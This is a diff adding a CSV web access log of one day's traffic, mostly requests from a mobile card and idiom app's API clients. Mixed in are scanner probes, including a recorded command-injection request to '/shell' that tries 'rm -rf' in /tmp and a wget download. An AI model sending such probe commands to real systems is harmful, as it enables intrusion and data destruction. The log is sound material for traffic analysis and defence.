@@ -1,0 +1,195 @@
+ip,time,method,endpoint,status,size,agent
+43.129.169.161,2025-07-07 00:01:41+00:00,HEAD,/Core/Skin/Login.aspx,301,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+43.129.169.161,2025-07-07 00:01:42+00:00,HEAD,/Core/Skin/Login.aspx,404,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+117.198.203.191,2025-07-07 00:07:32+00:00,GET,/api/user/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:07:32+00:00,GET,/api/user/info/,200,115,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:07:33+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:07:34+00:00,GET,/api/cards/play-and-sponsor/,200,563,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:07:35+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:07:35+00:00,GET,/api/cards/play-idiom/,200,853,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:08:16+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:08:16+00:00,GET,/api/user/info/,200,115,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:08:19+00:00,POST,/api/stats/share-stats/,200,385,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:08:26+00:00,GET,/api/user/info/,200,115,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+117.198.203.191,2025-07-07 00:08:26+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+43.246.163.155,2025-07-07 00:28:25+00:00,GET,/api/user/,200,52,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:28:25+00:00,GET,/api/user/info/,200,115,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:28:26+00:00,GET,/api/cards/play-and-sponsor/,200,668,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:28:26+00:00,GET,/api/cards/banner-ads/,200,52,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:28:29+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:28:29+00:00,GET,/api/cards/play-idiom/,200,865,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:30:00+00:00,GET,/api/cards/banner-ads/,200,52,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:30:00+00:00,GET,/api/user/info/,200,115,okhttp/4.9.2
+24.44.54.18,2025-07-07 00:35:38+00:00,GET,/api/user/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:35:39+00:00,GET,/api/user/info/,200,115,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:35:39+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:35:39+00:00,GET,/api/cards/play-and-sponsor/,200,609,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:35:42+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:35:42+00:00,GET,/api/cards/play-idiom/,200,844,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:37:16+00:00,POST,/api/cards/play-and-sponsor/,200,50,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+24.44.54.18,2025-07-07 00:37:17+00:00,GET,/api/user/info/,200,115,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+43.246.163.155,2025-07-07 00:40:01+00:00,GET,/api/user/,200,52,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:40:01+00:00,GET,/api/user/info/,200,111,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:40:01+00:00,GET,/api/cards/play-and-sponsor/,200,395,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:40:02+00:00,GET,/api/cards/banner-ads/,200,52,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:40:04+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,okhttp/4.9.2
+43.246.163.155,2025-07-07 00:40:04+00:00,GET,/api/cards/play-idiom/,200,853,okhttp/4.9.2
+71.6.134.234,2025-07-07 00:45:59+00:00,GET,/,302,154,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+71.6.134.234,2025-07-07 00:45:59+00:00,GET,/,404,159,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+71.6.134.234,2025-07-07 00:49:10+00:00,GET,/favicon.ico,302,154,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+71.6.134.234,2025-07-07 00:56:59+00:00,GET,/,404,159,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+71.6.134.234,2025-07-07 01:04:41+00:00,GET,/favicon.ico,404,179,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+3.131.215.38,2025-07-07 01:04:53+00:00,GET,/,400,666,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36
+3.131.215.38,2025-07-07 01:05:05+00:00,GET,/,400,666,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36
+13.89.124.214,2025-07-07 01:06:42+00:00,GET,/druid/index.html,301,178,Mozilla/5.0 zgrab/0.x
+89.42.231.140,2025-07-07 01:07:21+00:00,POST,/goform/formJsonAjaxReq,301,178,Go-http-client/1.1
+89.42.231.140,2025-07-07 01:07:22+00:00,GET,/goform/formJsonAjaxReq,404,179,Go-http-client/1.1
+3.131.215.38,2025-07-07 01:07:43+00:00,GET,/,302,154,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36
+3.131.215.38,2025-07-07 01:07:45+00:00,GET,/,404,159,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36
+198.235.24.159,2025-07-07 01:10:38+00:00,GET,/,301,178,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+71.6.232.27,2025-07-07 01:11:36+00:00,GET,/,302,154,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+8.219.188.210,2025-07-07 01:12:29+00:00,GET,/shell?cd+/tmp;rm+-rf+*;wget+,301,178,"Hello, world"
+51.158.205.47,2025-07-07 01:21:39+00:00,GET,/,301,178,masscan/1.3 (https://github.com/robertdavidgraham/masscan)
+65.49.1.162,2025-07-07 01:35:26+00:00,GET,/,302,154,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
+43.129.169.161,2025-07-07 01:40:53+00:00,HEAD,/Core/Skin/Login.aspx,301,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+43.129.169.161,2025-07-07 01:40:53+00:00,HEAD,/Core/Skin/Login.aspx,404,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+65.49.1.167,2025-07-07 01:44:51+00:00,GET,/favicon.ico,302,154,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
+65.49.1.165,2025-07-07 01:47:18+00:00,GET,/,302,154,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
+65.49.1.166,2025-07-07 01:48:16+00:00,GET,/,302,154,Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+65.49.1.169,2025-07-07 01:55:54+00:00,GET,/vpn/index.html,302,154,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
+196.251.70.164,2025-07-07 02:20:02+00:00,GET,/,301,178,-
+43.130.60.195,2025-07-07 02:59:31+00:00,GET,/,301,178,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.130.60.195,2025-07-07 02:59:34+00:00,GET,/,404,159,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.167.241.46,2025-07-07 03:14:55+00:00,GET,/,301,178,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.167.241.46,2025-07-07 03:14:56+00:00,GET,/,404,159,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.129.169.161,2025-07-07 03:20:10+00:00,HEAD,/Core/Skin/Login.aspx,301,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+43.129.169.161,2025-07-07 03:20:11+00:00,HEAD,/Core/Skin/Login.aspx,404,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+91.231.89.100,2025-07-07 03:24:48+00:00,GET,/,404,179,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+152.58.16.63,2025-07-07 03:25:38+00:00,GET,/api/user/,200,52,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:25:38+00:00,GET,/api/cards/play-and-sponsor/,200,696,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:25:38+00:00,GET,/api/user/info/,200,115,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:25:38+00:00,GET,/api/cards/banner-ads/,200,52,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:25:41+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:25:41+00:00,GET,/api/cards/play-idiom/,200,889,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:26:37+00:00,GET,/api/user/info/,200,115,okhttp/4.9.2
+152.58.16.63,2025-07-07 03:26:37+00:00,GET,/api/cards/banner-ads/,200,52,okhttp/4.9.2
+20.169.104.246,2025-07-07 03:41:05+00:00,GET,/,301,178,Mozilla/5.0 zgrab/0.x
+43.153.71.12,2025-07-07 03:52:00+00:00,GET,/,301,178,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+43.153.71.12,2025-07-07 03:52:01+00:00,GET,/,404,159,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+79.124.58.198,2025-07-07 04:14:24+00:00,GET,/?XDEBUG_SESSION_START=phpstorm,302,154,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+79.124.58.198,2025-07-07 04:14:30+00:00,GET,/?XDEBUG_SESSION_START=phpstorm,404,159,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+147.185.133.75,2025-07-07 04:39:07+00:00,GET,/,301,178,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+147.185.133.75,2025-07-07 04:39:08+00:00,GET,/,404,159,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+49.36.50.232,2025-07-07 04:44:55+00:00,GET,/api/user/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:44:55+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:44:56+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:44:56+00:00,GET,/api/cards/play-and-sponsor/,200,680,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:44:59+00:00,GET,/api/cards/play-idiom/?show_previous_day_idiom=true,200,311,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:44:59+00:00,GET,/api/cards/play-idiom/,200,874,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+198.235.24.134,2025-07-07 04:46:11+00:00,GET,/,404,179,-
+49.36.50.232,2025-07-07 04:46:26+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:26+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:29+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:29+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:30+00:00,GET,/api/cards/play-and-sponsor/,200,669,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:31+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:44+00:00,POST,/api/cards/play-and-sponsor/,404,27,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:46+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:52+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:52+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:52+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:53+00:00,GET,/api/cards/play-and-sponsor/,200,712,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:46:55+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:11+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:11+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:11+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:14+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:18+00:00,POST,/api/cards/play-and-sponsor/,404,27,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:19+00:00,GET,/api/cards/play-and-sponsor/,200,688,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:21+00:00,GET,/media/Card_Images/Bedroom1.png,200,474738,culturemaxapk/2.1.5 (iPhone; iOS 18.5; Scale/3.00)
+49.36.50.232,2025-07-07 04:47:21+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:49+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:49+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:49+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:51+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:56+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:56+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:56+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:57+00:00,GET,/api/cards/play-and-sponsor/,200,775,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:47:58+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:48:01+00:00,POST,/api/cards/play-and-sponsor/,404,27,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:48:03+00:00,GET,/media/Card_Images/Aajar2.png,200,182331,culturemaxapk/2.1.5 (iPhone; iOS 18.5; Scale/3.00)
+49.36.50.232,2025-07-07 04:48:03+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:01+00:00,POST,/api/cards/play-and-sponsor/,404,27,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:02+00:00,GET,/api/cards/play-and-sponsor/,200,677,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:03+00:00,GET,/media/Card_Images/Electronics1.png,200,507752,culturemaxapk/2.1.5 (iPhone; iOS 18.5; Scale/3.00)
+49.36.50.232,2025-07-07 04:49:04+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+95.215.0.144,2025-07-07 04:49:07+00:00,GET,/,301,178,"Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)"
+49.36.50.232,2025-07-07 04:49:18+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:18+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:18+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:20+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:25+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:25+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:25+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+5.101.64.6,2025-07-07 04:49:25+00:00,GET,/aaa9,301,178,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+5.101.64.6,2025-07-07 04:49:25+00:00,\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xC9\x0C/\xEA\xDD\x1D\x80\xD5\x1C+\x09'\x1D$\xBBc\x8C,\xDD\xD9\xB7X\x1D\xB3\xAEv\xB8\xEC\xE4.\xEA\xB5,400,166,-
+5.101.64.6,2025-07-07 04:49:26+00:00,GET,/aab9,301,178,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+49.36.50.232,2025-07-07 04:49:26+00:00,GET,/api/cards/play-and-sponsor/,200,589,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:27+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:29+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:30+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:30+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:32+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:42+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:42+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:42+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:43+00:00,GET,/api/cards/play-and-sponsor/,200,624,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:45+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:46+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:46+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:46+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:49:48+00:00,GET,/media/Card_Images/panchamrut1.png,200,475148,culturemaxapk/2.1.5 (iPhone; iOS 18.5; Scale/3.00)
+49.36.50.232,2025-07-07 04:49:48+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:02+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:03+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:03+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:04+00:00,GET,/api/cards/play-and-sponsor/,200,642,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:04+00:00,GET,/media/Card_Images/Drama.png,200,486668,culturemaxapk/2.1.5 (iPhone; iOS 18.5; Scale/3.00)
+49.36.50.232,2025-07-07 04:50:05+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:22+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:22+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:22+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:25+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:27+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:27+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:27+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:28+00:00,GET,/api/cards/play-and-sponsor/,200,283,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:29+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:31+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:31+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:31+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:32+00:00,GET,/api/cards/play-and-sponsor/,200,289,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:34+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:35+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:35+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:35+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:36+00:00,GET,/api/cards/play-and-sponsor/,200,295,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:37+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
